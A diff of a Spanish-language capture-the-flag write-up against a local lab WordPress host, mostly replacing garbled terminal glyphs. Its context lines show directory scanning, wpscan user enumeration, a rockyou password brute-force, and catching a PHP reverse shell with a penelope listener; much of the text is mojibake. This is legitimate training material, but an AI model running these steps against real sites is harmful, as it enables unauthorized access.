@@ -12,11 +12,11 @@ Fecha: 2026-02-16
 Para empezar realizaremos un reconocimiento para ver que podemos encontrar.
 
 ```bash
-¯é░ settarget 172.17.0.2                                              
+é settarget 172.17.0.2                                              
 TARGET establecido: 172.17.0.2
 
-¯é░ gomap -s $TARGET                                                                                                         
-­ƒÄ» Scanning 172.17.0.2 (997 ports)
+é gomap -s $TARGET                                                                                                         
+­ Scanning 172.17.0.2 (997 ports)
 
  PORT    STATE  SERVICE      VERSION
 80 open http Apache 2.4.57 (Debian)
@@ -25,7 +25,7 @@ TARGET establecido: 172.17.0.2
 Tenemos un servicio corriendo en el puerto 80 bajo un apache, pero en la ra├¡z ├║nicamente encontramos la p├ígina por defecto de Apache, por lo que procederemos a realizar enumeraci├│n de directorios.
 
 ```bash
-¯é░ dirb http://$TARGET                                                                                          
+é dirb http://$TARGET                                                                                          
 
 -----------------
 DIRB v2.22    
@@ -60,7 +60,7 @@ Estamos frente a un Wordpress en una carpeta distinta al ra├¡z, as├¡ que v
 Solo encontramos en una publicaci├│n el usuario **mario** as├¡ que usaremos una herramienta para ver si encontramos mas informaci├│n.
 
 ```bash
-¯é░ wpscan --url http://$TARGET/wordpress/ -e u,p --plugins-detection aggressive
+é wpscan --url http://$TARGET/wordpress/ -e u,p --plugins-detection aggressive
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -154,7 +154,7 @@ En tema de usuarios vemos que solo existe el mismo que encontramos antes, **mari
 Pero intentaremos encontrar primero el acceso del usuario *mario*.
 
 ```bash
-¯é░ wpscan --url http://$TARGET/wordpress/ -U mario --passwords /usr/share/wordlists/rockyou.txt
+é wpscan --url http://$TARGET/wordpress/ -U mario --passwords /usr/share/wordlists/rockyou.txt
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -189,20 +189,20 @@ Una vez dentro nos dirigiremos al plugin vulnerable que encontramos antes para i
 Usaremos el c├│digo PHP de Pentestmonkey's reverse shell y nos pondremos a la escucha.
 
 ```bash
-¯é░ penelope -p 443    
+é penelope -p 443    
 [+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.3 ÔÇó 172.17.0.1
-Ô×ñ  ­ƒÅá Main Menu (m) ­ƒÆÇ Payloads (p) ­ƒöä Clear (Ctrl-L) ­ƒÜ½ Quit (q/Ctrl-C)
-[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 ­ƒÿì´©Å Assigned SessionID <1>
+Ô×ñ  ­Åá Main Menu (m) ­ÆÇ Payloads (p) ­ö Clear (Ctrl-L) ­Ü½ Quit (q/Ctrl-C)
+[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 ­ÿì´©Å Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
 [+] Attempting to spawn a reverse shell on 172.17.0.1:443
-[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 ­ƒÿì´©Å Assigned SessionID <2>
+[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 ­ÿì´©Å Assigned SessionID <2>
 [+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/script! ­ƒÆ¬
+[+] Shell upgraded successfully using /usr/bin/script! ­Æ¬
 [+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/jduran/.penelope/sessions/cf97ec34ece9~172.17.0.2-Linux-x86_64/2026_02_16-16_05_00-759.log ­ƒô£
+[+] Logging to /home/jduran/.penelope/sessions/cf97ec34ece9~172.17.0.2-Linux-x86_64/2026_02_16-16_05_00-759.log ­ô£
 ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
-[+] Shell upgraded successfully using /usr/bin/script! ­ƒÆ¬
+[+] Shell upgraded successfully using /usr/bin/script! ­Æ¬
 www-data@cf97ec34ece9:/$ 
 ```
 
@@ -236,3 +236,4 @@ Aunque el plugin theme-editor presenta vulnerabilidades conocidas, en este caso 
 ---
 Si te gusto puedes invitarme a un cafe.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
+
